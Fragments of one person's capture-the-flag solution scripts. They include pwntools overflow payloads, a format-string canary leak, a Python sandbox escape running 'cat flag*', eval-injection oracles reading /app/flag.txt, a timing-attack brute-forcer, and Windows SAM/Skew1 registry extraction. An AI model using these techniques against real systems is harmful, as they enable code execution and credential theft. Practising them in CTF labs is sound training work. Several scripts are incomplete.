        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/solution.py
    def extract_skew1_bootkey_piece(self, hive_path: str) -> str:
        with open(hive_path, "rb") as f:
            data = f.read()

        # 1) locate the ASCII string “Skew1”
        skew_idx = data.find(b"Skew1")
        if skew_idx == -1:
            raise ValueError("Could not find Skew1 key name in hive")

        # 2) step back to the beginning of its `nk` (key-node) cell
        nk_offset = data.rfind(b"nk", 0, skew_idx)  # signature 0x6E 0x6B
        if nk_offset == -1:
            raise ValueError("`nk` signature not found before Skew1")

        nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

        # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
        class_offset = struct.unpack_from("<I", data, nk_cell_start + 0x30)[0]
        class_length = struct.unpack_from("<H", data, nk_cell_start + 0x4E)[0]

        # The class-name offset is hive-relative (relative to first HBIN, which
        # starts immediately after the 0x1000-byte REGF header).
        class_file_offset = class_offset + 0x1000

        # 4) at that position we find another registry cell – grab its whole body
        cell_size = struct.unpack_from("<i", data, class_file_offset)[0]
        cell_len = abs(cell_size)  # value is stored as negative
        cell_blob = data[class_file_offset : class_file_offset + cell_len]

        # 5) build the flag
        return f"ECSC{{{cell_blob.hex().upper()}}}"

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def get_functions(self, variable):
        """
        Get all functions of a variable
        """
        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func)) and not func.startswith("__")
        ]

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def hive_solution(self):
        self.hive = RegistryHive(self.challenge_file)
        security_answers = []
        users_base = r"\SAM\Domains\Account\Users"
        users_key = self.hive.get_key(users_base)
        # print(hive)

        # Get all functions of the hive object
        hive_functions = self.get_functions(self.hive)

        # print("Hive Functions:", hive_functions)
        users_key_functions = self.get_functions(users_key)

        # Get the name for each user from subkey.name

        user_key = "000003E9"  # print("Users Key Functions:", users_key_functions)

        user_subkeys = users_key.get_subkey(user_key)
        # print("User Subkeys:", user_subkeys.get_value(""))

        # value_v = user_subkeys.get_value("V")
        value_reset = user_subkeys.get_value("ResetData")
        # value_force = user_subkeys.get_value("ForcePasswordReset")

        # decoded_value_v = self._decode_v_value(value_v)
        decoded_value_reset = self._decode_v_value(value_reset)
        # decoded_value_force = self._decode_v_value(value_force)

        # print("Decoded V Value:", decoded_value_v)
        # print("Decoded Reset Value:", decoded_value_reset)
        # print("Decoded Force Value:", decoded_value_force)

        # print(decoded_value_reset)

        # Join the list into a single string and parse it as JSON
        decoded_json = json.loads("".join(decoded_value_reset))
        flag = f"ECSC{{{':'.join([item["answer"] for item in  decoded_json["questions"]])}}}"
        # answers = [item["answer"] for item in decoded_value_reset.get()]
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def look_all_subkeys(self):
        # Unused
        security_answers = []
        users_base = r"\SAM\Domains\Account\Users"
        users_key = self.hive.get_key(users_base)

        for subkey in users_key.iter_subkeys():

            # for subkey in users_key.subkeys_list:
            if subkey.name == "Names":
                continue  # Skip the Names key

            try:

                print(subkey.name, subkey.values_count, list(subkey.iter_values()))
                v_value = subkey.get_value("V")
                # print(f"Value for {subkey.name}: {v_value}")
                decoded = self._decode_v_value(v_value)
                if decoded:
                    security_answers.extend(decoded)
            except Exception as e:
                print(e)
                continue

        print(security_answers)
        # Only keep unique and plausible answers (e.g. non-binary junk)
        cleaned = [a for a in security_answers if a and a.isprintable()]
        cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

        return
        # Format answer according to challenge
        result = f"ECSC{{{':'.join(cleaned[:3])}}}"
        print(result)
        self.flag = result

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def _decode_v_value(self, value_bytes):
        try:
            # Decode as UTF-16LE (standard for registry)
            text = value_bytes.decode("utf-16le", errors="ignore")
            # Extract readable strings
            candidates = re.findall(r"[\x20-\x7e]{3,}", text)
            # print(candidates)
            return candidates

            def is_valid(s):
                if len(s) > 30 or len(s) < 3:
                    return False
                if re.fullmatch(r"[0-9a-fA-F]{6,}", s):  # ignore hashes
                    return False
                if sum(c.isalpha() for c in s) < 2:
                    return False
                return True

            return [c for c in candidates if is_valid(c)]

        except Exception as e:
            print(f"Decoding error: {e}")
            return []

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def main(self):
        self.hive_solution()

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def _discover_offset(self, nk):
        """
        Try every attribute name that regipy has ever used for the cell offset.
        If none work, fall back to a regex scan in the raw hive buffer.
        """
        CANDIDATE_ATTRS = (
            "offset",
            "_offset",  # early regipy
            "absolute_offset",
            "_absolute_offset",
            "header_offset",
            "_header_offset",
            "raw_data_offset",
            "_raw_data_offset",
        )

        for attr in CANDIDATE_ATTRS:
            try:
                off = getattr(nk, attr)
                if isinstance(off, int):
                    return off
            except AttributeError:
                # Attribute existed as a @property but its backing field is gone
                continue

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_functions(self, variable, under=False):
        """
        Get all functions of a variable
        """

        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func))
            and (under or not (func.startswith("__")))
        ]

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_attributes(self, variable):
        """
        Get all attributes of a variable
        """

        return [
            attr
            for attr in dir(variable)
            if not callable(getattr(variable, attr)) and not (attr.startswith("__"))
        ]

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def skew_get_value(self):
        self.hive = RegistryHive(self.challenge_file)

        with open(self.challenge_file, "rb") as f:
            self.hive_data = f.read()

        # print(self.get_functions(self.hive))
        # control_set = self.hive.get_key(r"ControlSet001")
        skew1_key = self.hive.get_key(r"\ControlSet001\Control\Lsa\Skew1")
        print(self.get_functions(skew1_key))
        # print(self.get_attributes(skew1_key))
        # cell_offset = self._discover_offset(skew1_key)
        # print(f"Offset of Skew1 key: {cell_offset}")

        for i in skew1_key.iter_values():
            print(i.name, i.value)
            if i.name == "SkewMatrix":
                return i.value

        return None

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def attempt_for_loop_subkeys(self):
        skew1_key = self.hive.get_key(r"\ControlSet001\Control\Lsa")

        for subkey in skew1_key.iter_subkeys():
            # print(f"Subkey: {subkey.name}, ")
            if subkey.name == "Skew1":
                # print(f"Found Skew1 subkey: {subkey.name}")
                # for subvalue in subkey.iter_values
                print(self.get_functions(subkey))
                # print(self.get_attributes(subkey))
                print(dir(subkey))
                # skew1_subkey = subkey._parse_subkeys()
                # print(f"Skew1 Subkey: {skew1_subkey}")
                for sub_subkey in subkey.iter_subkeys():
                    print(
                        f"Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}"
                    )

                print(f"Values - {subkey.name}:")
                for value in subkey.iter_values():
                    print(f"  Value Name: {value.name}, Value Data: {value.value}")
                for sub_subkey in subkey.iter_subkeys():
                    print(
                        f"Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}"
                    )

        # Using this to get all the subkeys
        # for i in skew1_key.iter_subkeys():
        #     print(i.name, i.value.)

        # for i in skew1_key.iter_values():
        #     if i.name == "SkewMatrix":
        #         print("Found SkewMatrix value:")
        #         return i.value
        #     print(i.name, i.value)

        # class_name = skew1_key.header.class_name
        # print(f"Class Name: {class_name}")
        # values = skew1_key.values()
        # print(f"Values: {values}")

        # print(control_set.read_value())
        # print(control_set.get_class_name())

        # skew1 = self.hive.open("ControlSet001\\Control\\Lsa\\Skew1")

        # offset =
        return

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_cell_size(self):
        reg = Registry.Registry(self.challenge_file)
        print(self.get_functions(reg, under=False))

        lsa_key = reg.open(r"ControlSet001")
        print(self.get_functions(lsa_key))

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def recover_skew1_cell_hex(self, cell_size, cell_data):
        """
        Recover the Skew1 part of the Windows BootKey as a continuous hex string.

        Args:
            cell_size (int): The size of the registry cell (including size bytes and data).
            cell_data (bytes): The raw bytes of the cell data including the Skew1 Class Name/Attribute.

        Returns:
            str: The continuous hex string in the format ECSC{...}
        """
        # Convert cell size to 4 bytes, little-endian
        size_bytes = cell_size.to_bytes(4, byteorder="little")
        # Concatenate size and data
        full_cell = size_bytes + cell_data
        # Convert to uppercase hex string
        hex_string = full_cell.hex().upper()
        # Format as flag
        return hex_string

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def main(self):
        # self.get_cell_size()
        result = self.skew_get_value()

        self.attempt_for_loop_subkeys()

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def get_functions(self, variable):
        """
        Get all functions of a variable
        """
        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func)) and not func.startswith("__")
        ]

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def hive_solution(self):
        self.hive = RegistryHive(self.challenge_file)
        security_answers = []
        users_base = r"\SAM\Domains\Account\Users"
        users_key = self.hive.get_key(users_base)
        # print(hive)

        # Get all functions of the hive object
        hive_functions = self.get_functions(self.hive)

        # print("Hive Functions:", hive_functions)
        users_key_functions = self.get_functions(users_key)

        # Get the name for each user from subkey.name

        user_key = "000003E9"  # print("Users Key Functions:", users_key_functions)

        user_subkeys = users_key.get_subkey(user_key)
        # print("User Subkeys:", user_subkeys.get_value(""))

        # value_v = user_subkeys.get_value("V")
        value_reset = user_subkeys.get_value("ResetData")
        # value_force = user_subkeys.get_value("ForcePasswordReset")

        # decoded_value_v = self._decode_v_value(value_v)
        decoded_value_reset = self._decode_v_value(value_reset)
        # decoded_value_force = self._decode_v_value(value_force)

        # print("Decoded V Value:", decoded_value_v)
        # print("Decoded Reset Value:", decoded_value_reset)
        # print("Decoded Force Value:", decoded_value_force)

        # print(decoded_value_reset)

        # Join the list into a single string and parse it as JSON
        decoded_json = json.loads("".join(decoded_value_reset))
        flag = f"ECSC{{{':'.join([item["answer"] for item in  decoded_json["questions"]])}}}"
        # answers = [item["answer"] for item in decoded_value_reset.get()]
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def look_all_subkeys(self):
        # Unused
        security_answers = []
        users_base = r"\SAM\Domains\Account\Users"
        users_key = self.hive.get_key(users_base)

        for subkey in users_key.iter_subkeys():

            # for subkey in users_key.subkeys_list:
            if subkey.name == "Names":
                continue  # Skip the Names key

            try:

                print(subkey.name, subkey.values_count, list(subkey.iter_values()))
                v_value = subkey.get_value("V")
                # print(f"Value for {subkey.name}: {v_value}")
                decoded = self._decode_v_value(v_value)
                if decoded:
                    security_answers.extend(decoded)
            except Exception as e:
                print(e)
                continue

        print(security_answers)
        # Only keep unique and plausible answers (e.g. non-binary junk)
        cleaned = [a for a in security_answers if a and a.isprintable()]
        cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

        return
        # Format answer according to challenge
        result = f"ECSC{{{':'.join(cleaned[:3])}}}"
        print(result)
        self.flag = result

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def _decode_v_value(self, value_bytes):
        try:
            # Decode as UTF-16LE (standard for registry)
            text = value_bytes.decode("utf-16le", errors="ignore")
            # Extract readable strings
            candidates = re.findall(r"[\x20-\x7e]{3,}", text)
            # print(candidates)
            return candidates

            def is_valid(s):
                if len(s) > 30 or len(s) < 3:
                    return False
                if re.fullmatch(r"[0-9a-fA-F]{6,}", s):  # ignore hashes
                    return False
                if sum(c.isalpha() for c in s) < 2:
                    return False
                return True

            return [c for c in candidates if is_valid(c)]

        except Exception as e:
            print(f"Decoding error: {e}")
            return []

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def main(self):
        self.hive_solution()

	# /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def custom_init(self):
        self.folder_files = self.Path(self.folder_files, "challenge")
        self.library = self.Path(self.folder_files, "glibc")
        self.challenge_file = self.Path(self.folder_files, self.file)

        self.pwn.context.binary = self.Path(self.challenge_file)

        self.env = {"LD_PRELOAD": self.library.as_posix()}

	# /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def connect(self, *args, **kwargs) -> None:
        # return super().initiate_connection()
        self.conn = self.pwn.process(self.challenge_file.as_posix(), env=self.env)

	# /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def main(self):
        self.custom_init()
        self.initiate_connection()

        # self.recv_menu(display=True)
        payload = "a" * 31

        # self.send_menu(payload, display=True)

        self.conn.sendline(payload.encode())

	# /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def __init__(self, conn, file, url, port):
        super().__init__(conn=conn, file=file, url=url, port=port)

        self.pwn.context.binary = self.binary = self.pwn.ELF(
            self.challenge_file, checksec=True
        )

        self.libc_path = self.Path(self.folder_files, "glibc", "libc.so.6")
        self.ld_path = self.Path(self.folder_files, "glibc", "ld-linux-x86-64.so.2")

        self.env = {"LD_PRELOAD": str(self.libc_path), "LD": str(self.ld_path)}

	# /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def connect(self, *args, **kwargs) -> None:
        if self.conn_type == "remote" and self.url and self.port:
            self.conn = self.pwn.remote(self.url, self.port)
        elif self.conn_type == "local" and self.file:
            self.conn = self.pwn.process(
                [str(self.ld_path), str(self.challenge_file)], env=self.env
            )

	# /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def interacting_with_binary(self):

        self.initiate_connection()

        initial_menu = "[*] Initializing components...\n"

        # self.recv_menu(number=10, display=True)
        output = self.conn.recvuntil(initial_menu)
        print(output)

	# /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def main(self):

        self.interacting_with_binary()

	# /home/figaro/CTF/Categories/Pwn/HTB/Quack_Quack/payloads/solution.py
    def main(self):
        self.initiate_connection()

        menu_text = "> "
        payload = "Quack Quack "
        payload += "%p. " * 40
        print(payload)
        self.recv_send(text_until=menu_text, text=payload, lines=34)

        result = self.recv_lines(number=4, display=True, save=True)

        # This is not yet complete, but it is a good start
        canary = result[0].split(".")[1]
        canary = int(canary, 16)
        print(f"Canary: {hex(canary)}")
        # Step 2: Craft Overflow Payload
        payload = b"A" * 32  # Fill `buf`
        payload += self.pwn.p64(canary)  # Bypass stack canary
        payload += b"B" * 8  # Overwrite saved RBP
        payload += p64(
            0xDEADBEEF
        )

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def setup(self):
        self.elf = self.pwn.context.binary = self.pwn.ELF(self.challenge_file)
        self.pwn.context.terminal = ["tmux", "splitw", "-h"]

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def get_elf_function_address(self, function):
        """
        Description:
        """
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def challenge_get_offset_address(self, function1, function2):
        offset = self.get_elf_function_address(
            function1
        ) - self.get_elf_function_address(function2)
        return offset

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def main(self):
        # self.elf = None
        self.setup()
        self.initiate_connection()
        # main_offset = self.challenge_get_offset_address("main", "emergency_broadcast")
        emergency_broadcast_addr = self.get_elf_function_address("emergency_broadcast")
        print(f"Emergency Broadcast Address: {hex(emergency_broadcast_addr)}")
        payload1 = b"A" * 8
        print(payload1)
        payload2 = b"B" * 0x18 + self.pwn.p64(emergency_broadcast_addr)
        print(payload2)

        # self.recv_lines(2, display=True)
        log_entry_text = "Enter log entry: "
        # self.recv_until(log_entry_text)
        # self.send(payload1)
        self.recv_send(text_until=log_entry_text, lines=2, text=payload1, display=True)

        data_entry_text = "Enter data: "
        # print(self.recv_until(data_entry_text))
        # self.send(payload2)
        self.recv_send(text_until=data_entry_text, text=payload2, display=True)

        # time.sleep(0.5)
        # self.recv_lines(2, display=True)

        self.conn.interactive()

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def get_elf_function_address(self, function):
        """
        Description:
        """
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def challenge_get_offset_address(self, function1, function2):
        offset = self.get_elf_function_address(
            function1
        ) - self.get_elf_function_address(function2)
        return offset

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def main(self):
        self.initiate_connection()
        self.elf = None
        # main_offset = self.challenge_get_offset_address("main", "emergency_broadcast")
        emergency_broadcast_addr = self.get_elf_function_address("emergency_broadcast")
        payload1 = b"A" * 24
        # + b"\x91"
        print(payload1)
        payload2 = b"B" * 24 + self.pwn.p64(emergency_broadcast_addr)
        print(payload2)
        self.recv_lines(2)
        log_entry_text = "Enter log entry: "
        self.recv_until(log_entry_text)
        self.send(payload1)
        data_entry_text = "Enter data: "
        self.recv_until(data_entry_text)
        self.send(payload2)
        self.conn.interactive()

	# /home/figaro/CTF/Categories/Miscellaneous/Reply/Flagsembler/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Miscellaneous/plaidctf/Hangman/payloads/solution.py
    def main(self):
        pass

	# /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
        """
        Brute forces ROT47 shifts to find the one that contains the known text.

        Args:
            crypted_text (str): The encrypted text.
            known_text (str): The known plaintext to look for.
            max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

        Returns:
            int: The shift that contains the known text, or -1 if not found.
        """
        for shift in range(1, max_shift):
            decrypted_text = self.rot(crypted_text, shift)
            if known_text.lower() in decrypted_text.lower():
                return shift
        return -1

	# /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot(self, text, shift):
        """
        Applies the ROT47 cipher to the given text with the specified shift.

        Args:
            text (str): The input text.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The transformed text.
        """
        return "".join([self.rot_char(c, shift) for c in text])

	# /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def rot_char(self, c, shift):
        """
        Rotates a single character using the ROT47 cipher.

        Args:
            c (str): The input character.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The rotated character.
        """
        ascii_code = ord(c)
        if 33 <= ascii_code <= 126:  # ROT47 only affects printable ASCII
            return chr((ascii_code - 33 + shift) % 94 + 33)
        return c

	# /home/figaro/CTF/Categories/Miscellaneous/CSCG/It-Admin/payloads/solution.py
    def main(self):
        hexing = "6a0077002d0032002c0054003d006400420071004e004700250053002800680064004f007800490046002000780044004c00710058002600530038006e004f003b004c0022002400670064002100500060005d0055003d006c0027003000290069002e004d002500660071004c005400710077006e0037005600330031003a003e006d004d0033006d0070006c003c005600500034003b0045003d003d007a0071005f004c0067006d004a005b0049002e00410056002b0076003d0060007a004b002c005b007a005f002000380039005e006d00230074005e002200680040002d006e0079002e00370066002e005300"
        result = ""
        for i in range(0, len(hexing), 2):
            # print(hexing[i : i + 2])
            if hexing[i : i + 2] == "00":
                result += " "
            else:
                result += hexing[i : i + 2]
        print(result)

        decoded = bytes.fromhex(hexing).decode("utf-16")
        print(decoded)
        partial = "}"
        shift = self.rot_bruteforce(decoded, partial)
        print(f"Shift: {shift}")
        print(f"Decoded: {self.rot(decoded, shift)}")

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/solution.py
    def main(self):
        selections = [
            "3_0",
            "1_2",
            "3_2",
            "1_1",
            "5_0",
            "0_0",
            "2_0",
            "1_0",
            "3_1",
            "5_2",
            "5_1",
            "6_0",
            "6_1",
            "3_3",
            "2_1",
            "2_2",
            "0_1",
        ]
        seldir = {
            0: {0: 123, 1: 125},
            1: {0: 80, 1: 67, 2: 72},
            2: {0: 80, 1: 101, 2: 82},
            3: {0: 78, 1: 84, 2: 52, 3: 84},
            5: {0: 75, 1: 109, 2: 88},
            6: {0: 52, 1: 53},
        }

        flag = ""
        for s in selections:
            nums = [int(i) for i in s.split("_")]
            flag += chr(seldir[nums[0]][nums[1]])
        print(flag)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/solution.py
    def verify_js_reconstructed(self):
        self.challenge_file = self.Path(self.folder_data, "chall_edited.pptx")
        self.try_catch(self.run)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def main(self):
        self.challenge_file = self.Path(self.folder_data, "chall_edited.pptx")
        self.try_catch(self.run)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def run(self):
        selections = [
            "3_0",
            "1_2",
            "3_2",
            "1_1",
            "5_0",
            "0_0",
            "2_0",
            "1_0",
            "3_1",
            "5_2",
            "5_1",
            "6_0",
            "6_1",
            "3_3",
            "2_1",
            "2_2",
            "0_1",
        ]

        prs = Presentation(self.challenge_file)
        correct = True

        for selection in selections:
            slide_index = int(selection[0])
            shape_index = 1 if selection[0] != "0" else 0
            text_index = int(selection[2])

            slide = prs.slides[slide_index]
            shape = slide.shapes[shape_index]
            text = shape.text

            if slide_index == 0:
                if text_index == 0 and text[0] != chr(123):
                    correct = False
                elif text_index == 1 and text[23] != chr(125):
                    correct = False
            elif slide_index == 1:
                if text_index == 0 and text[41] != chr(80):
                    correct = False
                elif text_index == 1 and text[138] != chr(67):
                    correct = False
                elif text_index == 2 and text[184] != chr(72):
                    correct = False
            elif slide_index == 2:
                if text_index == 0 and text[0] != chr(80):
                    correct = False
                elif text_index == 1 and text[83] != chr(101):
                    correct = False
                elif text_index == 2 and text[179] != chr(82):
                    correct = False
            elif slide_index == 3:
                if text_index == 0 and text[25] != chr(78):
                    correct = False
                elif text_index == 1 and text[26] != chr(84):
                    correct = False
                elif text_index == 2 and text[28] != chr(52):
                    correct = False
                elif text_index == 3 and text[84] != chr(84):
                    correct = False
            elif slide_index == 5:
                if text_index == 0 and text[105] != chr(75):
                    correct = False
                elif text_index == 1 and text[106] != chr(109):
                    correct = False
                elif text_index == 2 and text[219] != chr(88):
                    correct = False
            elif slide_index == 6:
                if text_index == 0 and text[52] != chr(52):
                    correct = False
                elif text_index == 1 and text[95] != chr(53):
                    correct = False

        if correct:
            print("Thanx for helping me out, now go input the flag")
        else:
            print("I don't think i had that in mind")

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Challenge_Idea/payloads/verify.py
    def try_catch(self, callback):
        try:
            callback()
        except Exception as error:
            print(error)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/Snekbox/payloads/solution.py
    def main(self):
        self.challenge_file = self.folfil("data", "edited_server.py")
        self.initiate_connection()
        self.menu_text = "> "
        self.menu_num = 0

        payload = 'globals().get("unsafe" + globals()["BLACKLIST"][6] + globals()["BLACKLIST"][9])()'
        self.send_menu(choice=payload)

        payload = """__import__('os').system("cat flag*")"""
        # payload = """print("THis is working " )"""
        self.send_menu(choice=payload)
        self.recv_lines(number=1, display=True)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def main(self):
        # self.initiate_connection()
        # self.exploitation()
        self.flouri_min = self.random_flouri_generator(number=1)
        self.flouri_max = self.random_flouri_generator(number=10**30)

        # self.recv_menu(number=2, save=True)
        # self.send_menu()

        self.brute_force()

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def test_letter(self, password):
        alphabet = string.ascii_letters + string.digits + string.punctuation

        results = []

        for i in alphabet:
            connector = CTFSolver(
                conn=self.conn_type, file=self.file, url=self.url, port=self.port
            )

            connector.menu_text = "Give me password and number in json: "
            connector.menu_num = 0

            connector.initiate_connection()
            connector.recv_lines(number=2, display=False)
            start_time = time.time()
            connector.send_menu(
                self.payload_maker(password + i, self.flouri_min), display=False
            )
            response = connector.recv_lines(number=1, save=True)

            connector.conn.close()

            end_time = time.time()

            results.append((i, end_time - start_time))

        results = sorted(results, key=lambda x: x[1])

        return results

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def brute_force(self):
        password = ""
        for _ in range(60):
            results = self.test_letter(password)
            print(results)
            password += results[0][0]
            print(password)

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def random_flouri_generator(self, number=None):
        m = 10**30

        if number:
            return (
                number**11
                + 17 * number**7
                - 42 * number**5
                + 1337 * number * 3
                + 31337 * number
            )

        return (
            random.randint(1, m) ** 11
            + 17 * random.randint(1, m) ** 7
            - 42 * random.randint(1, m) ** 5
            + 1337 * random.randint(1, m) * 3
            + 31337 * random.randint(1, m)
        )

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def check_password_time(self, length):
        start_time = time.time()
        for i in range(length):
            for _ in range(10000):
                pass
            return time.time() - start_time
        return time.time() - start_time

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def exploitation(self):
        self.recv_lines(number=2)

        self.menu_text = "Give me password and number in json: "

        self.menu_num = 1

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def length_find(self):

        lenghter = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )
        for i in range(10, 130):
            time_reference = self.check_password_time(i)

            print(time_reference)

            lenghter.initiate_connection()
            lenghter.recv_lines(number=2)
            lenghter.menu_num = 0
            menu_text = "Give me password and number in json: "
            payload = self.payload_maker("NH4CK{" + "a" * i, self.flouri_min + i)

            start_time = time.time()
            # lenghter.recv_lines(number=2, display=True)
            lenghter.send_menu(payload, menu_text=menu_text, display=True)

            print("Trying length: ", i)
            response = lenghter.recv_lines(number=1, display=True, save=True)
            stop_time = time.time()

            duration = stop_time - start_time

            if b"GLYKO and HUGS" in response[0]:
                print("length found", i)
                print(response[0])
                # return i

            if b"sweet AND lucky" in response[0]:
                print("Found the correct length")
                print("Duration: ", duration)
                print("Response: ", response[0])
                print("Payload: ", payload)
                print("Flouri: ", self.flouri_min + i)
                sys.exit(0)
                return i

            if b"Something wrong honey?" in response[0]:
                return i

            print(f"Duration: {duration}")
            print(f"Time Reference: {time_reference}")
            if duration > time_reference:
                print("Length found: ", i)
                return i

	# /home/figaro/CTF/Categories/Miscellaneous/NTUA/NaKopsoGlyko/payloads/solution.py
    def payload_maker(self, password, number):
        payload = {"password": password, "number": number}
        return json.dumps(payload)

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def main(self):
        self.real_url = f"http://{self.url}:{self.port}"
        self.url_path = f"{self.real_url}/calculate"
        # self.sending_request()
        self.preparing_dictionary()
        self.get_flag_length()
        self.flag = "ECSC{"
        self.bruteforcer()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def sending_request(self, exploit=None, verbose=False):

        # payload = "```python\nwith open('/app/flag.txt') as f:\n result = f.read()\nprint(result)\n```"

        headers = {
            "Content-Type": "application/json",
            "Origin": self.real_url,
            "Referer": f"{self.real_url}/",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
            "Accept": "*/*",
        }
        payload = {"equation": exploit}

        response = requests.post(self.url_path, headers=headers, json=payload)
        if verbose:
            print("[+] Status:", response.status_code)
            print("[+] Response:", response.text)
            print(response.json())
        return response.json()

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def get_flag_length(self):
        exploit = "0+len(open('/app/flag.txt').read())"
        response = self.sending_request(exploit=exploit, verbose=False)
        if response and "result" in response:
            try:
                self.flag_length = int(response["result"])
                print(f"[+] Flag length: {self.flag_length}")
            except ValueError:
                print("[-] Failed to parse flag length.")
        else:
            print("[-] No valid response received.")

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def exploit_development(self, i, letter):
        # variable = "+".join([ord(l) * 1000 * i for i, l in enumerate("ECSC{TEST}")])
        # print(variable)
        exploit = f"0+(1 if open('/app/flag.txt').read()[{i}]=='{letter}' else 0)"
        return exploit

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def preparing_dictionary(self):
        """
        This method is not used in the current solution.
        It can be implemented if needed for future enhancements.
        """
        additional = {
            "e": 3,
            "a": 4,
            "i": 1,
            "o": 0,
            "s": 5,
            "t": 7,
            "g": 9,
        }
        self.dictionary = "_-{}"
        for i in range(len(ascii_uppercase)):
            if ascii_lowercase[i] in additional:
                self.dictionary += str(additional[ascii_lowercase[i]])
            self.dictionary += ascii_uppercase[i] + ascii_lowercase[i]
        self.dictionary += digits + punctuation

	# /home/figaro/CTF/Categories/Miscellaneous/ECSC/CalculAltor/payloads/solution.py
    def bruteforcer(self):
        for i in range(len(self.flag), self.flag_length):
            for letter in self.dictionary:
